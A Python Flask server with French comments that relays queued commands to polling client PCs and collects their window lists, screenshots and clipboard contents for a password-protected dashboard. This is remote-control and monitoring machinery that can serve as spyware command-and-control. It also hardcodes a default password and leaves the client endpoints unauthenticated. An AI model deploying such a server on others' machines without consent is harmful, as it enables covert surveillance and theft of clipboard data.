from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import time
import os
import secrets
import hashlib
from collections import deque

app = Flask(__name__, static_folder='static')
CORS(app)

# ── Authentification ───────────────────────────────────────────────────────────
PASSWORD = os.environ.get('APP_PASSWORD', 'Soleil!Lune92i!Mars')
TOKENS = set()   # tokens de session valides (en mémoire)

def check_token():
    """Vérifie le token dans le header X-Auth-Token. Retourne True si valide."""
    token = request.headers.get('X-Auth-Token', '')
    return token in TOKENS

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json or {}
    pwd = data.get('password', '')
    if pwd == PASSWORD:
        token = secrets.token_hex(32)
        TOKENS.add(token)
        return jsonify({"ok": True, "token": token})
    return jsonify({"ok": False, "error": "Mot de passe incorrect"}), 401

@app.route('/api/logout', methods=['POST'])
def logout():
    data = request.json or {}
    token = data.get('token', '') or request.headers.get('X-Auth-Token', '')
    TOKENS.discard(token)
    return jsonify({"ok": True})

# ── Stockage multi-PC ─────────────────────────────────────────────────────────
pcs = {}
TIMEOUT = 8

def get_or_create_pc(pc_id, name=None):
    if pc_id not in pcs:
        pcs[pc_id] = {
            "name": name or pc_id,
            "last_seen": 0,
            "queue": deque(maxlen=50),
            "windows": [],
            "screenshot": None,
            "clipboard": None,
        }
    elif name:
        pcs[pc_id]["name"] = name
    return pcs[pc_id]

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

# ── Routes appelées par le SITE WEB (protégées) ───────────────────────────────

@app.route('/api/pcs')
def list_pcs():
    if not check_token():
        return jsonify({"error": "Non autorisé"}), 401
    now = time.time()
    result = []
    for pc_id, pc in pcs.items():
        result.append({
            "id": pc_id,
            "name": pc["name"],
            "online": (now - pc["last_seen"]) < TIMEOUT
        })
    return jsonify(result)

@app.route('/api/status')
def status():
    if not check_token():
        return jsonify({"error": "Non autorisé"}), 401
    pc_id = request.args.get('pc_id')
    if not pc_id or pc_id not in pcs:
        return jsonify({"online": False})
    online = (time.time() - pcs[pc_id]["last_seen"]) < TIMEOUT
    return jsonify({"online": online})

@app.route('/api/send', methods=['POST'])
def send_command():
    if not check_token():
        return jsonify({"error": "Non autorisé"}), 401
    data = request.json
    if not data or 'type' not in data:
        return jsonify({"error": "Commande invalide"}), 400
    pc_id = data.get('pc_id')
    if not pc_id or pc_id not in pcs:
        return jsonify({"error": "PC introuvable"}), 404
    cmd = {
        "id": int(time.time() * 1000),
        "type": data["type"],
        "payload": data.get("payload", {}),
        "timestamp": time.time()
    }
    pcs[pc_id]["queue"].append(cmd)
    return jsonify({"ok": True, "id": cmd["id"]})

@app.route('/api/windows')
def get_windows():
    if not check_token():
        return jsonify({"error": "Non autorisé"}), 401
    pc_id = request.args.get('pc_id')
    if not pc_id or pc_id not in pcs:
        return jsonify({"windows": []})
    return jsonify({"windows": pcs[pc_id]["windows"]})

@app.route('/api/screenshot')
def get_screenshot():
    if not check_token():
        return jsonify({"error": "Non autorisé"}), 401
    pc_id = request.args.get('pc_id')
    if not pc_id or pc_id not in pcs:
        return jsonify({"image": None})
    return jsonify({"image": pcs[pc_id].get("screenshot")})

@app.route('/api/clipboard')
def get_clipboard():
    if not check_token():
        return jsonify({"error": "Non autorisé"}), 401
    pc_id = request.args.get('pc_id')
    if not pc_id or pc_id not in pcs:
        return jsonify({"text": None})
    return jsonify({"text": pcs[pc_id].get("clipboard")})

# ── Routes appelées par le CLIENT PC (pas de token nécessaire) ────────────────

@app.route('/api/poll')
def poll():
    pc_id = request.args.get('pc_id')
    name = request.args.get('name', pc_id)
    if not pc_id:
        return jsonify({"commands": []})
    pc = get_or_create_pc(pc_id, name)
    pc["last_seen"] = time.time()
    commands = list(pc["queue"])
    pc["queue"].clear()
    return jsonify({"commands": commands})

@app.route('/api/report_windows', methods=['POST'])
def report_windows():
    data = request.json
    if not data:
        return jsonify({"ok": False}), 400
    pc_id = data.get('pc_id')
    if not pc_id:
        return jsonify({"ok": False}), 400
    pc = get_or_create_pc(pc_id)
    pc["windows"] = data.get("windows", [])
    return jsonify({"ok": True})

@app.route('/api/screenshot_result', methods=['POST'])
def screenshot_result():
    data = request.json
    if not data:
        return jsonify({"ok": False}), 400
    pc_id = data.get('pc_id')
    if not pc_id:
        return jsonify({"ok": False}), 400
    pc = get_or_create_pc(pc_id)
    pc["screenshot"] = data.get("image")
    return jsonify({"ok": True})

@app.route('/api/clipboard_result', methods=['POST'])
def clipboard_result():
    data = request.json
    if not data:
        return jsonify({"ok": False}), 400
    pc_id = data.get('pc_id')
    if not pc_id:
        return jsonify({"ok": False}), 400
    pc = get_or_create_pc(pc_id)
    pc["clipboard"] = data.get("text")
    return jsonify({"ok": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
